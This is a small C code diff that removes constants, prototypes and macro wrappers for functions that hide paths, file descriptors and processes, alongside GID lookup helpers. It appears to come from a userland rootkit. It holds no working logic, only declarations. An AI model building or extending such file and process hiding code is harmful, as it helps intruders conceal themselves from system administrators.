@@ -15,22 +15,7 @@ gid_t get_fd_gid(int fd);
 gid_t get_fd_gid64(int fd);
 #include "get_path_gid.c"
 
-#define MODE_REG 0x32  /* STAT MODE FOR REGULAR FILES. */
-#define MODE_64  0x64  /* STAT MODE FOR BIG FILES. */
-
-int _hidden_path(const char *pathname, short mode);
-int _f_hidden_path(int fd, short mode);
-int _l_hidden_path(const char *pathname, short mode);
-int hidden_proc(pid_t pid);
 #include "hidden.c"
-
-#define hidden_ppid(pid)     hidden_proc(getppid())
-#define hidden_path(path)    _hidden_path(path, MODE_REG)
-#define hidden_path64(path)  _hidden_path(path, MODE_64)
-#define hidden_fd(fd)        _f_hidden_path(fd, MODE_REG)
-#define hidden_fd64(fd)      _f_hidden_path(fd, MODE_64)
-#define hidden_lpath(path)   _l_hidden_path(path, MODE_REG)
-#define hidden_lpath64(path) _l_hidden_path(path, MODE_64)
 
 
 
